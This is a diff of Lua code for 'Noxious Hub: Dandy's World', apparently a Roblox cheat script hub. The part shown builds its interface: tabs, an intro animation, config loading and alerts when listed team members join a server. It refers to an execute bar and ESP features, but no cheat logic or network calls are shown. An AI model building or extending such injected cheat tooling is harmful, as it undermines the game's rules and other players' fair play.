+noxious["workspace.info button"].MouseButton1Click:Connect(
+	function()
+		playclicksound()
+		noxious["workspace.info button"].Text = "> Workspace.Info <"
+		noxious["noxious info button"].Text = "Noxious Info"
+
+		noxious["information holder"].Visible = false
+		noxious["dandy's world workspace.info holder"].Visible = true
+	end
+)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["noxious info button"].MouseButton1Click:Connect(
+	function()
+		playclicksound()
+		noxious["workspace.info button"].Text = "Workspace.Info"
+		noxious["noxious info button"].Text = "> Noxious Info <"
+
+		noxious["information holder"].Visible = true
+		noxious["dandy's world workspace.info holder"].Visible = false
+	end
+)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["changelogs tab"].MouseButton1Click:Connect(
+	function()
+		playclicksound()
+		shouldseecmdbar = false
+		noxious["back button"].Visible = false
+		noxious["back to functions button"].Visible = true
+		noxious["reload noxious button"].Visible = true
+		noxious["dandy's world workspace.info holder"].Visible = false
+		noxious["workspace.info button"].Visible = false
+		noxious["noxious info button"].Visible = false
+		noxious["credits tab"].Text = "Credits"
+		noxious["changelogs tab"].Text = "> Changes <"
+		noxious["functions tab"].Text = "Functions"
+		noxious["information tab"].Text = "Info"
+		noxious["configurations tab"].Visible = false
+		noxious["settings tab"].Visible = false
+		noxious["execute button"].Visible = false
+		noxious["hide"].Visible = false
+		noxious["information holder"].Visible = false
+		noxious["credits holder"].Visible = false
+		noxious["changelogs holder"].Visible = true
+		noxious["introduction"].Visible = false
+		noxious["command button holder"].Visible = false
+		noxious["command bar"].Visible = false
+		noxious["scroll bar holder"].Visible = false
+		noxious["scroll bar holder 2"].Visible = true
+		local commandscrollframe = mainframe:FindFirstChild("CommandScrollFrame")
+		local buttoncontainer = mainframe:FindFirstChild("ButtonContainer")		
+		if commandscrollframe then
+			commandscrollframe.Visible = false
+		end
+		if buttoncontainer then
+			buttoncontainer.Visible = false
+		end
+	end
+)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["information tab"].MouseButton1Click:Connect(
+	function()
+		playclicksound()
+		shouldseecmdbar = false
+		noxious["back button"].Visible = false
+		noxious["back to functions button"].Visible = false
+		noxious["reload noxious button"].Visible = false
+		noxious["dandy's world workspace.info holder"].Visible = false
+		noxious["noxious info button"].Text = "> Noxious Info <"
+		noxious["workspace.info button"].Text = "Workspace.Info"
+		noxious["workspace.info button"].Visible = true
+		noxious["noxious info button"].Visible = true
+		noxious["execute button"].Visible = false
+		noxious["hide"].Visible = false
+		noxious["credits tab"].Text = "Credits"
+		noxious["changelogs tab"].Text = "Changes"
+		noxious["functions tab"].Text = "Functions"
+		noxious["information tab"].Text = "> Info <"
+		noxious["configurations tab"].Visible = false
+		noxious["settings tab"].Visible = false
+		noxious["information holder"].Visible = true
+		noxious["credits holder"].Visible = false
+		noxious["changelogs holder"].Visible = false
+		noxious["introduction"].Visible = false
+		noxious["command button holder"].Visible = false
+		noxious["command bar"].Visible = false
+		noxious["scroll bar holder"].Visible = false
+		noxious["scroll bar holder 2"].Visible = true
+		local commandscrollframe = mainframe:FindFirstChild("CommandScrollFrame")
+		local buttoncontainer = mainframe:FindFirstChild("ButtonContainer")		
+		if commandscrollframe then
+			commandscrollframe.Visible = false
+		end
+		if buttoncontainer then
+			buttoncontainer.Visible = false
+		end
+	end
+)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["credits tab"].MouseButton1Click:Connect(
+	function()
+		playclicksound()
+		shouldseecmdbar = false
+		noxious["back button"].Visible = false
+		noxious["back to functions button"].Visible = true
+		noxious["reload noxious button"].Visible = false
+		noxious["dandy's world workspace.info holder"].Visible = false
+		noxious["workspace.info button"].Visible = false
+		noxious["noxious info button"].Visible = false
+		noxious["credits tab"].Text = "> Credits <"
+		noxious["changelogs tab"].Text = "Changes"
+		noxious["functions tab"].Text = "Functions"
+		noxious["information tab"].Text = "Info"
+		noxious["configurations tab"].Visible = false
+		noxious["settings tab"].Visible = false
+		noxious["execute button"].Visible = false
+		noxious["hide"].Visible = false
+		noxious["information holder"].Visible = false
+		noxious["credits holder"].Visible = true
+		noxious["changelogs holder"].Visible = false
+		noxious["introduction"].Visible = false
+		noxious["command button holder"].Visible = false
+		noxious["command bar"].Visible = false
+		noxious["scroll bar holder"].Visible = false
+		noxious["scroll bar holder 2"].Visible = true
+		local commandscrollframe = mainframe:FindFirstChild("CommandScrollFrame")
+		local buttoncontainer = mainframe:FindFirstChild("ButtonContainer")	
+		if commandscrollframe then
+			commandscrollframe.Visible = false
+		end
+		if buttoncontainer then
+			buttoncontainer.Visible = false
+		end
+	end
+)
+
+noxious["back button"].MouseButton1Click:Connect(
+	function()
+		playclicksound()
+		shouldseecmdbar = false
+		noxious["back button"].Visible = false
+		noxious["back to functions button"].Visible = true
+		noxious["reload noxious button"].Visible = false
+		noxious["dandy's world workspace.info holder"].Visible = false
+		noxious["workspace.info button"].Visible = false
+		noxious["noxious info button"].Visible = false
+		noxious["credits tab"].Visible = true
+		noxious["changelogs tab"].Visible = true
+		noxious["functions tab"].Visible = true
+		noxious["information tab"].Visible = true
+		noxious["credits tab"].Text = "> Credits <"
+		noxious["changelogs tab"].Text = "Changes"
+		noxious["functions tab"].Text = "Functions"
+		noxious["information tab"].Text = "Info"
+		noxious["configurations tab"].Visible = false
+		noxious["settings tab"].Visible = false
+		noxious["execute button"].Visible = false
+		noxious["hide"].Visible = false
+		noxious["information holder"].Visible = false
+		noxious["credits holder"].Visible = true
+		noxious["changelogs holder"].Visible = false
+		noxious["introduction"].Visible = false
+		noxious["command button holder"].Visible = false
+		noxious["command bar"].Visible = false
+		noxious["scroll bar holder"].Visible = false
+		noxious["scroll bar holder 2"].Visible = true
+		local commandscrollframe = mainframe:FindFirstChild("CommandScrollFrame")
+		local buttoncontainer = mainframe:FindFirstChild("ButtonContainer")	
+		if commandscrollframe then
+			commandscrollframe.Visible = false
+		end
+		if buttoncontainer then
+			buttoncontainer.Visible = false
+		end
+	end
+)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["functions tab"].MouseButton1Click:Connect(
+	function()
+		playclicksound()
+		shouldseecmdbar = true
+		noxious["back button"].Visible = false
+		noxious["back to functions button"].Visible = false
+		noxious["reload noxious button"].Visible = false
+		noxious["dandy's world workspace.info holder"].Visible = false
+		noxious["workspace.info button"].Visible = false
+		noxious["noxious info button"].Visible = false
+		noxious["execute button"].Visible = true
+		noxious["hide"].Visible = true
+		noxious["credits tab"].Text = "Credits"
+		noxious["changelogs tab"].Text = "Changes"
+		noxious["functions tab"].Text = "> Functions <"
+		noxious["information tab"].Text = "Info"
+		noxious["configurations tab"].Visible = false
+		noxious["settings tab"].Visible = false
+		noxious["information holder"].Visible = false
+		noxious["credits holder"].Visible = false
+		noxious["changelogs holder"].Visible = false
+		noxious["introduction"].Visible = true
+		noxious["command button holder"].Visible = true
+		noxious["command bar"].Visible = true
+		noxious["scroll bar holder"].Visible = true
+		noxious["scroll bar holder 2"].Visible = false
+		local commandscrollframe = mainframe:FindFirstChild("CommandScrollFrame")	
+		local buttoncontainer = mainframe:FindFirstChild("ButtonContainer")	
+		if commandscrollframe then
+			commandscrollframe.Visible = true
+		end
+		if buttoncontainer then
+			buttoncontainer.Visible = true
+			noxious["scroll bar holder 2"].Visible = true
+		end
+	end
+)
+
+noxious["back to functions button"].MouseButton1Click:Connect(
+	function()
+		playclicksound()
+		shouldseecmdbar = true
+		noxious["back button"].Visible = false
+		noxious["back to functions button"].Visible = false
+		noxious["reload noxious button"].Visible = false
+		noxious["dandy's world workspace.info holder"].Visible = false
+		noxious["workspace.info button"].Visible = false
+		noxious["noxious info button"].Visible = false
+		noxious["execute button"].Visible = true
+		noxious["hide"].Visible = true
+		noxious["credits tab"].Text = "Credits"
+		noxious["changelogs tab"].Text = "Changes"
+		noxious["functions tab"].Text = "> Functions <"
+		noxious["information tab"].Text = "Info"
+		noxious["configurations tab"].Visible = false
+		noxious["settings tab"].Visible = false
+		noxious["information holder"].Visible = false
+		noxious["credits holder"].Visible = false
+		noxious["changelogs holder"].Visible = false
+		noxious["introduction"].Visible = true
+		noxious["command button holder"].Visible = true
+		noxious["command bar"].Visible = true
+		noxious["scroll bar holder"].Visible = true
+		noxious["scroll bar holder 2"].Visible = false
+		local commandscrollframe = mainframe:FindFirstChild("CommandScrollFrame")	
+		local buttoncontainer = mainframe:FindFirstChild("ButtonContainer")	
+		if commandscrollframe then
+			commandscrollframe.Visible = true
+			noxious["list sublabel"].Visible = true
+		end
+		if buttoncontainer then
+			buttoncontainer.Visible = true
+			noxious["scroll bar holder 2"].Visible = true
+		end
+	end
+)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+if noxious["is mobile?"] then
+	noxious["toggle interface visibility button"].TouchTap:Connect(
+		function()
+			togglevisibility()
+			playclicksound()
+		end
+	)
+else
+	noxious["toggle interface visibility button"].MouseButton1Click:Connect(
+		function()
+			togglevisibility()
+			playclicksound()
+		end
+	)
+end
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+shouldseecmdbar = true
+oldtopframetext = noxious["top frame text"].Text
+oldtopframesubtext = noxious["top frame subtext"].Text
+
+noxious["minimize interface button"].MouseButton1Click:Connect(
+	function()
+		playclicksound()
+
+		if mainframe.Visible == true then 
+			mainframe.Visible = false
+		else
+			mainframe.Visible = true
+		end
+
+		if noxious["mainframe"].Size == UDim2.new(0, 594, 0, 330) then 
+			noxious["mainframe"].Size = UDim2.new(0, 594, 0, 52)
+			noxious["mainframe shadow"].Size = UDim2.new(0, 608, 0, 65)
+		else
+			noxious["mainframe"].Size = UDim2.new(0, 594, 0, 330)
+			noxious["mainframe shadow"].Size = UDim2.new(0, 608, 0, 350)
+		end
+
+		if noxious["minimize interface button"].Text == "-" then
+			noxious["minimize interface button"].Text = "+"
+		else
+			noxious["minimize interface button"].Text = "-"
+		end
+
+		if noxious["top frame profile picture"].Image == "https://www.roblox.com/headshot-thumbnail/image?userId=" .. noxious["local player"].UserId .. "&width=420&height=420&format=png" then
+			noxious["top frame profile picture"].Image = "rbxassetid://130584446591314"
+		else
+			noxious["top frame profile picture"].Image = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. noxious["local player"].UserId .. "&width=420&height=420&format=png"
+		end
+
+		if noxious["minimize interface button"].Text == "+" then
+			oldtopframetext = noxious["top frame text"].Text
+			oldtopframesubtext = noxious["top frame subtext"].Text
+			noxious["top frame text"].Text = "Noxious Hub: Dandy's World"
+			noxious["top frame subtext"].Text = "Team Noxious & Team Occulence"
+		else
+			noxious["top frame text"].Text = oldtopframetext
+			noxious["top frame subtext"].Text = oldtopframesubtext
+		end
+
+		if noxious["tabs frame"].Visible == true then 
+			noxious["tabs frame"].Visible = false
+		else
+			noxious["tabs frame"].Visible = true
+		end
+
+		if noxious["bottom frame"].Visible == true then 
+			noxious["bottom frame"].Visible = false
+		else
+			noxious["bottom frame"].Visible = true
+		end
+
+		if noxious["command bar"].Visible == true then 
+			noxious["command bar"].Visible = false
+		else
+			if not shouldseecmdbar then return end
+			noxious["command bar"].Visible = true
+		end
+
+		if noxious["hide"].Visible == true then 
+			noxious["hide"].Visible = false
+		else
+			noxious["hide"].Visible = true
+		end
+
+		if noxious["execute button"].Visible == true then 
+			noxious["execute button"].Visible = false
+		else
+			noxious["execute button"].Visible = true
+		end
+	end
+)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["bottom frame team icon"] = Instance.new("ImageLabel")
+noxious["bottom frame team icon"].Size = UDim2.new(0, 36.3, 0, 36.3)
+noxious["bottom frame team icon"].Position = UDim2.new(0.926, 0, 0.1579, 0)
+noxious["bottom frame team icon"].BackgroundTransparency = 0
+noxious["bottom frame team icon"].BackgroundColor3 = noxious["default black color"]
+noxious["bottom frame team icon"].BorderSizePixel = 1
+noxious["bottom frame team icon"].BorderColor3 = noxious["default white color"]
+noxious["bottom frame team icon"].Image = "rbxassetid://130584446591314"
+noxious["bottom frame team icon"].Parent = noxious["bottom frame"]
+noxious["bottom frame team icon"].ImageColor3 = noxious["default white color"]
+
+noxious["bottom frame team icon ui corner"] = Instance.new("UICorner")
+noxious["bottom frame team icon ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["bottom frame team icon ui corner"].Parent = noxious["bottom frame team icon"]
+
+noxious["bottom frame team icon border"] = Instance.new("Frame")
+noxious["bottom frame team icon border"].Size = UDim2.new(0, 38.3, 0, 38.3)
+noxious["bottom frame team icon border"].Position = UDim2.new(0, -1, 0, -1)
+noxious["bottom frame team icon border"].BackgroundColor3 = noxious["default white color"]
+noxious["bottom frame team icon border"].BorderSizePixel = 0
+noxious["bottom frame team icon border"].ZIndex = 18
+noxious["bottom frame team icon border"].Parent = noxious["bottom frame team icon"]
+
+noxious["bottom frame team icon border ui corner"] = Instance.new("UICorner")
+noxious["bottom frame team icon border ui corner"].CornerRadius = UDim.new(0.2, 0)
+noxious["bottom frame team icon border ui corner"].Parent = noxious["bottom frame team icon border"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["bottom frame title"] = Instance.new("TextLabel")
+noxious["bottom frame title"].Size = UDim2.new(0.978, 0, 1.1, -5.5)
+noxious["bottom frame title"].Position = UDim2.new(0, -37, -0.18, 1)
+noxious["bottom frame title"].BackgroundTransparency = 1
+noxious["bottom frame title"].TextColor3 = noxious["default white color"]
+noxious["bottom frame title"].Font = Enum.Font.Nunito
+noxious["bottom frame title"].TextSize = 21.6
+noxious["bottom frame title"].TextScaled = false
+noxious["bottom frame title"].Text = "Noxious Hub: Dandy's World"
+noxious["bottom frame title"].TextXAlignment = Enum.TextXAlignment.Right
+noxious["bottom frame title"].Parent = noxious["bottom frame"]
+
+noxious["bottom frame subtitle"] = Instance.new("TextLabel")
+noxious["bottom frame subtitle"].Size = UDim2.new(0.978, 0, 1.1, -5.5)
+noxious["bottom frame subtitle"].Position = UDim2.new(0, -37, 0.18, 1)
+noxious["bottom frame subtitle"].BackgroundTransparency = 1
+noxious["bottom frame subtitle"].TextColor3 = noxious["default gray color"]
+noxious["bottom frame subtitle"].Font = Enum.Font.Nunito
+noxious["bottom frame subtitle"].TextSize = 18
+noxious["bottom frame subtitle"].TextScaled = false
+noxious["bottom frame subtitle"].Text = "Team Noxious & Team Occulence"
+noxious["bottom frame subtitle"].TextXAlignment = Enum.TextXAlignment.Right
+noxious["bottom frame subtitle"].Parent = noxious["bottom frame"]
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+noxious["toggle interface visibility button"].ZIndex = 20000
+noxious["tivb border"].ZIndex = 19999
+
+noxious["tabs frame"].ZIndex = 18
+noxious["credits tab"].ZIndex = 19
+noxious["configurations tab"].ZIndex = 19
+noxious["settings tab"].ZIndex = 19
+noxious["information tab"].ZIndex = 19
+noxious["changelogs tab"].ZIndex = 19
+noxious["functions tab"].ZIndex = 19
+noxious["scroll bar holder 2"].ZIndex = 2
+
+noxious["noxious info button"].ZIndex = 19
+noxious["workspace.info button"].ZIndex = 19
+noxious["reload noxious button"].ZIndex = 19
+noxious["back to functions button"].ZIndex = 19
+noxious["back button"].ZIndex = 19
+
+noxious["command bar"].ZIndex = 19
+noxious["execute button"].ZIndex = 31
+noxious["hide"].ZIndex = 22
+
+noxious["top frame"].ZIndex = 17
+noxious["top frame profile picture"].ZIndex = 19
+noxious["top frame text"].ZIndex = 19
+noxious["top frame subtext"].ZIndex = 19
+noxious["reposition interface button"].ZIndex = 19
+noxious["minimize interface button"].ZIndex = 19
+noxious["hide interface button"].ZIndex = 19
+
+noxious["dandy's world workspace.info holder"].ZIndex = 18
+noxious["changelogs holder"].ZIndex = 18
+noxious["information holder"].ZIndex = 18
+noxious["credits holder"].ZIndex = 18
+
+noxious["bottom frame"].ZIndex = 17
+noxious["bottom frame team icon"].ZIndex = 19
+noxious["bottom frame title"].ZIndex = 19
+noxious["bottom frame subtitle"].ZIndex = 19
+
+noxious["command button holder"].ZIndex = 16
+noxious["scroll bar holder"].ZIndex = 15
+
+------------------------------------------------------------------------------------------------------------------------------
+
+-- quadruple check...
+if not noxious["in studio"] then
+	loadnoxioussettings()
+	initializenoxioussettings()
+	syncespcolors()
+	print("[Noxious Hub]: File config load attempt #4")
+end
+
+------------------------------------------------------------------------------------------------------------------------------
+
+function intro()
+	local screenWidth = game:GetService("Workspace").CurrentCamera.ViewportSize.X
+	local screenHeight = game:GetService("Workspace").CurrentCamera.ViewportSize.Y
+
+	local frameWidth = 90
+	local frameHeight = 90
+	local centerX = (screenWidth - frameWidth) / 2
+	local centerY = (screenHeight - frameHeight) / 2 - 58
+
+	local screenGui = Instance.new("ScreenGui")
+	screenGui.Parent = noxious["screen gui"]
+
+	local function createAndTweenImage(imageId, startPosition, endPosition, startRotation, endRotation, duration)
+		local image = Instance.new("ImageLabel")
+		image.Size = UDim2.new(0, frameWidth, 0, frameHeight)
+		image.Position = startPosition
+		image.Image = imageId
+		image.BackgroundTransparency = 1
+		image.ImageTransparency = 1
+		image.Rotation = startRotation
+		image.Parent = screenGui
+
+		local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+
+		local positionTween = noxious["tween service"]:Create(image, tweenInfo, {Position = endPosition})
+		local transparencyTween = noxious["tween service"]:Create(image, tweenInfo, {ImageTransparency = 0})
+		local rotationTween = noxious["tween service"]:Create(image, tweenInfo, {Rotation = endRotation})
+
+		positionTween:Play()
+		rotationTween:Play()
+		task.wait(0.4)
+		transparencyTween:Play()
+
+		task.spawn(function()
+			positionTween.Completed:Wait()
+			rotationTween.Completed:Wait()
+			transparencyTween.Completed:Wait()
+		end)
+		task.wait(1.6)
+
+		image:Destroy()
+	end
+
+	local duration = 2
+	task.spawn(function() 
+		createAndTweenImage(
+			"rbxassetid://105319046533888",
+			UDim2.new(0.5, -frameWidth / 2, 0, -frameHeight),
+			UDim2.new(0, centerX, 0, centerY),
+			math.random(-180, 180),
+			0,
+			duration
+		)
+	end)
+	task.spawn(function() 
+		createAndTweenImage(
+			"rbxassetid://129058777635468",
+			UDim2.new(0.5, -frameWidth / 2, 1, 0),
+			UDim2.new(0, centerX, 0, centerY),
+			math.random(-180, 180),
+			0,
+			duration
+		)
+	end)
+	task.spawn(function() 
+		createAndTweenImage(
+			"rbxassetid://99947170158417",
+			UDim2.new(0, -frameWidth, 0.5, -frameHeight / 2),
+			UDim2.new(0, centerX, 0, centerY),
+			math.random(-180, 180),
+			0,
+			duration
+		)
+	end)
+	task.spawn(function() 
+		createAndTweenImage(
+			"rbxassetid://95135112375096",
+			UDim2.new(1, 0, 0.5, -frameHeight / 2),
+			UDim2.new(0, centerX, 0, centerY),
+			math.random(-180, 180),
+			0,
+			duration
+		)
+	end)
+
+	task.spawn(function() task.wait(duration - 0.7) end)
+
+	task.wait(duration)
+
+	local imageLabel = Instance.new("ImageButton")	
+	imageLabel.Parent = screenGui
+	imageLabel.Size = UDim2.new(0, frameWidth, 0, frameHeight)
+	imageLabel.Position = UDim2.new(0, centerX, 0, centerY)
+	imageLabel.Image = "rbxassetid://0"
+	imageLabel.BackgroundTransparency = 1
+	imageLabel.BorderSizePixel = 0
+	imageLabel.ImageTransparency = 1
+	imageLabel.ZIndex = 9999
+
+	local imageLabel2 = Instance.new("ImageLabel")	
+	imageLabel2.Parent = screenGui
+	imageLabel2.Size = UDim2.new(0, frameWidth, 0, frameHeight)
+	imageLabel2.Position = UDim2.new(0, centerX, 0, centerY)
+	imageLabel2.Image = "rbxassetid://100574547642033"
+	imageLabel2.BackgroundTransparency = 1
+	imageLabel2.BorderSizePixel = 0
+	imageLabel2.ImageTransparency = 0
+	imageLabel2.ZIndex = 9999
+
+	local textLabel = Instance.new("TextLabel")	
+	textLabel.Parent = screenGui
+	textLabel.Size = UDim2.new(0, frameWidth, 0, 40)
+	textLabel.Position = UDim2.new(0, centerX - 40, 0, centerY + 13)
+	textLabel.Text = " "
+	textLabel.TextStrokeColor3 = Color3.new(1,1,1)
+	textLabel.Font = Enum.Font.Nunito
+	textLabel.BackgroundTransparency = 1
+	textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+	textLabel.TextSize = 22
+	textLabel.TextTransparency = 1
+	textLabel.TextXAlignment = Enum.TextXAlignment.Left
+	textLabel.ZIndex = 9999
+
+	local textLabel2 = Instance.new("TextLabel")	
+	textLabel2.Parent = screenGui
+	textLabel2.Size = UDim2.new(0, frameWidth, 0, 30)
+	textLabel2.Position = UDim2.new(0, centerX - 40, 0, centerY + 42)
+	textLabel2.Text = " "
+	textLabel2.TextStrokeColor3 = Color3.new(1,1,1)
+	textLabel2.Font = Enum.Font.Nunito
+	textLabel2.BackgroundTransparency = 1
+	textLabel2.TextColor3 = noxious["default white color"]
+	textLabel2.TextSize = 21.6
+	textLabel2.TextTransparency = 0.5
+	textLabel2.TextXAlignment = Enum.TextXAlignment.Left
+	textLabel2.ZIndex = 9999
+
+	local targetPosition = UDim2.new(0, centerX - 118, 0, centerY)
+	local tweenInfo = TweenInfo.new(
+		0.5,
+		Enum.EasingStyle.Quad,
+		Enum.EasingDirection.InOut
+	)
+
+	local tween = noxious["tween service"]:Create(imageLabel2, tweenInfo, {
+		Position = targetPosition
+	})
+	local tween2 = noxious["tween service"]:Create(imageLabel, tweenInfo, {
+		Position = targetPosition
+	})
+
+	local skipRequested = false
+	local canSkip = false
+	local moveButtonCalled = false
+
+	local function fadeIn()
+		local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
+
+		local imageTween = noxious["tween service"]:Create(imageLabel, tweenInfo, {ImageTransparency = 1})
+		local imageTween2 = noxious["tween service"]:Create(imageLabel2, tweenInfo, {ImageTransparency = 0})
+
+		imageTween:Play()
+		imageTween2:Play()
+
+		imageTween.Completed:Wait()
+
+		local fullText1 = "Noxious Hub: Dandy's World"
+		local fullText2 = "Version " .. noxious["version"] .. " | Initializing..."
+		-- local fullText2 = "Test version 7.8.1 | Initializing..."
+
+		textLabel.Text = ""
+		textLabel2.Text = ""
+
+		local typingDelay = 0
+
+		task.spawn(function()
+			textLabel.TextTransparency = 0
+			textLabel2.TextTransparency = 0.5
+			for i = 1, #fullText1 do
+				textLabel.Text = string.sub(fullText1, 1, i)
+				task.wait(typingDelay)
+			end
+		end)
+
+		task.spawn(function()
+			for i = 1, #fullText2 do
+				textLabel2.Text = string.sub(fullText2, 1, i)
+				task.wait(typingDelay)
+			end
+		end)
+
+		task.spawn(function()
+			while not skipRequested do
+				local tweenInfo = TweenInfo.new(1.7, Enum.EasingStyle.Back, Enum.EasingDirection.InOut, -1)
+				local goal = {Rotation = imageLabel.Rotation + 360}
+				local tween = noxious["tween service"]:Create(imageLabel, tweenInfo, goal)
+				local tween2 = noxious["tween service"]:Create(imageLabel2, tweenInfo, goal)
+				tween:Play()
+				tween2:Play()
+				tween.Completed:Wait()
+				tween2.Completed:Wait()
+			end
+		end)
+
+		task.wait(1.5)
+
+		canSkip = true
+	end
+
+	task.spawn(function() tween:Play() tween2:Play() end)
+	task.spawn(function() task.spawn(fadeIn) end)
+
+	local function fadeOut()
+		task.spawn(function()
+			imageLabel:Destroy()
+		end)		
+		local tweenInfo = TweenInfo.new(0.5, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
+		noxious["tween service"]:Create(imageLabel2, tweenInfo, {ImageTransparency = 1}):Play()
+		noxious["tween service"]:Create(textLabel, tweenInfo, {TextTransparency = 1}):Play()
+		noxious["tween service"]:Create(textLabel2, tweenInfo, {TextTransparency = 1}):Play()
+		task.wait(0.5)
+		imageLabel2:Destroy()
+		textLabel:Destroy()
+		textLabel2:Destroy()
+	end
+
+	local function handleSkipOrComplete()
+		if not moveButtonCalled then
+			moveButtonCalled = true
+			task.spawn(function() centermainframe(true) dragmainframe() task.wait(0.3) movebutton() end)
+			task.spawn(function() populatecredits(noxious["credits"]) end)
+			task.spawn(function() populateInformation(noxious["information"]) end)
+			task.spawn(function() populateChangelogs(noxious["changelogs"]) end)
+			task.spawn(function() populateinfo() end)
+			task.spawn(function() fadeOut() end)
+			task.spawn(function() task.wait(5) if logexecution then log() end end)
+			noxious["loaded"] = true
+			ndebug("Load successful.")
+		end
+	end
+
+	local textLocked = false
+
+	local function setTextLabel2Text(newText)
+		if textLocked then return end
+		textLabel2.Text = newText
+		if newText == "Successfully loaded!" then
+			textLocked = true
+		end
+	end
+
+	noxious["user input service"].InputBegan:Connect(function(input, gameProcessed)
+		if gameProcessed then return end
+		if not canSkip then return end
+		if input.KeyCode == Enum.KeyCode.Q then
+			skipRequested = true
+			setTextLabel2Text"Loading sequence skipped."
+			handleSkipOrComplete()
+			task.spawn(handleSkipOrComplete)
+		end
+	end)
+
+	local function waitForCompletion()
+		local targetMessages = {
+			["Successfully loaded!"] = true,
+			["Loading sequence skipped."] = true
+		}
+
+		repeat
+			task.wait()
+		until targetMessages[textLabel2.Text]
+	end
+
+	local fadeOutFinished = false
+
+	local function handleSkip()
+		if not fadeOutFinished then
+			skipRequested = true
+			setTextLabel2Text("Loading sequence skipped.")
+			task.spawn(function() fadeOut() end)
+			task.spawn(handleSkipOrComplete)
+		end
+	end
+
+	local soundPlayed = false
+
+	imageLabel.MouseButton1Click:Connect(function()
+		if not canSkip then return end
+		if not soundPlayed then
+			playclicksound()
+			soundPlayed = true
+		end
+		handleSkip()
+	end)
+
+	task.spawn(function()
+		task.wait(math.random(3, 5))
+
+		if skipRequested then
+			setTextLabel2Text("Loading sequence skipped.")	
+		else
+			setTextLabel2Text("Successfully loaded!")
+		end
+
+		task.spawn(function() fadeOut() end)
+		task.spawn(handleSkipOrComplete)
+	end)
+
+	waitForCompletion()
+
+	local unablenotified = {}
+	local qwelvernotified = {}
+	local devnotified = {}
+	local hypnicnotified = {}
+
+	-- devs
+	local function devnotify(player, isJoining)
+		for _, scriptdeveloper in ipairs(noxious["admins"]) do
+			if player.Name == scriptdeveloper and not devnotified[player.UserId] then
+				if isJoining then
+					notify("A Noxious Team Member joined your server.", 5, "tmishere")
+				else
+					notify("A Noxious Team Member is in your your server.", 5, "tmishere")
+				end
+				devnotified[player.UserId] = true
+			end
+		end
+	end
+
+	-- unable
+	local function unablenotify(player, isJoining)
+		for _, unablealt in ipairs(noxious["unable"]) do
+			if player.Name == unablealt and not unablenotified[player.UserId] then
+				if isJoining then
+					notify("Unable joined your server.", 5, "unableishere")
+				else
+					notify("Unable is in your server.", 5, "unableishere")
+				end
+				unablenotified[player.UserId] = true
+			end
+		end
+	end
+
+	-- hypnic
+	local function hypnicnotify(player, isJoining)
+		for _, hypnicacc in ipairs(noxious["hypnic"]) do
+			if player.Name == hypnicacc and not hypnicnotified[player.UserId] then
+				if isJoining then
+					notify("Hypnic joined your server.", 5, "hypnicishere")
+				else
+					notify("Hypnic is in your server.", 5, "hypnicishere")
+				end
+				hypnicnotified[player.UserId] = true
+			end
+		end
+	end
+
+	-- qwelver
+	local function qwelvernotify(player, isJoining)
+		for _, fakeqwelver in ipairs(noxious["qwelver"]) do
+			if player.Name == fakeqwelver and not qwelvernotified[player.UserId] then
+				if isJoining then
+					notify("Qwelver joined your server.", 5, "qwelverishere")
+				else
+					notify("Qwelver is in your server.", 5, "qwelverishere")
+				end
+				qwelvernotified[player.UserId] = true
+			end
+		end
+	end
+
+	noxious["players"].PlayerAdded:Connect(function(player)
+		unablenotify(player, true)
+		hypnicnotify(player, true)
+		qwelvernotify(player, true)
+		devnotify(player, true)
+	end)
+
+	noxious["players"].PlayerRemoving:Connect(function(player)
+		devnotified[player.UserId] = nil
+		unablenotified[player.UserId] = nil
+		hypnicnotified[player.UserId] = nil
+		qwelvernotified[player.UserId] = nil
+	end)
+
+	for _, player in ipairs(noxious["players"]:GetPlayers()) do
+		unablenotify(player, false)
+		hypnicnotify(player, false)
+		qwelvernotify(player, false)
+		devnotify(player, false)
+	end
+
+	if istester(noxious["username"]) then
+		task.spawn(function()
+			notify("Welcome, tester.", 5)
+			-- task.wait(1.5)
+			-- notify("You are currently using an unreleased version of Noxious Hub: Dandy's World.", 5, "warning")
+		end)
+	end
+
+	task.wait(1.5)
+
+	if game.PlaceId ~= noxious["dandy's world lobby"] 
+		and game.PlaceId ~= noxious["dandy's world run"] 
+		and game.PlaceId ~= noxious["dandy's world roleplay server"] 
+		and not noxious["in studio"] then
+
+		notify("You aren't in Dandy's World.", 5, "warning")
+
+		task.wait(1.5)
+
+		notify("This script will not function properly.", 5, "warning")
+	end
+end
+
+cantogglevisibility = false
+canusekeybind = true
+
+noxious["user input service"].InputBegan:Connect(function(input)
+	if not cantogglevisibility then return end
+	if not canusekeybind then return end
+	if input.KeyCode == Enum.KeyCode[togglekeybind] then
+		togglevisibility()
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+-- fuck it
+task.spawn(function()
+	if not noxious["in studio"] then
+		loadnoxioussettings()
+		initializenoxioussettings()
+		syncespcolors()
+		print("[Noxious Hub]: File config load attempt #5")
+	end
+
+	if not noxious["in studio"] then
+		loadnoxioussettings()
+		initializenoxioussettings()
+		syncespcolors()
+		print("[Noxious Hub]: File config load attempt #6")
+	end
+
+	if not noxious["in studio"] then
+		loadnoxioussettings()
+		initializenoxioussettings()
+		syncespcolors()
+		print("[Noxious Hub]: File config load attempt #7")
+	end
+end)
+
+-------------------------------------------------------------------------------------------------------------------------------
+
+function popup(func, title, text, button1, button2, iserror)
+	if noxious["halt mainframe"] then noxious["halt mainframe"]:Destroy() noxious["halt text"]:Destroy() end
+
+	if iserror then
+		noxious["default halt mainframe white color"] = Color3.new(1, 0.3, 0.3)
+	else
+		noxious["default halt mainframe white color"] = noxious["default white color"]
+	end
+
+	local lonebutton = false
+	if not button2 then lonebutton = true end
+
+	noxious["alert sound"] = Instance.new("Sound")
